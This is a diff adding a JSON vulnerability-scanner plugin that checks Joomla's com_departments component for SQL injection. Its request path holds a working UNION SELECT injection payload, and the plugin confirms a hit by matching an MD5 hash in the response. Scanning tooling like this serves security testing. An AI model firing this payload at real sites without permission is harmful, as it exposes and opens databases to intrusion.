@@ -1,0 +1,23 @@
+{
+    "target":"joomla",
+    "meta":{
+        "name":    "Joomla departments SQL注入",
+        "remarks": "Joomla departments 存在SQL注入漏洞",
+        "level":   1,
+        "type":    "SQL注入",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0063"
+        }
+    },
+    "request":{
+        "path":     "/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5(700),3,4,5,6,7,8--",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "e5841df2166dd424a57127423d276bbe"
+    }
+}
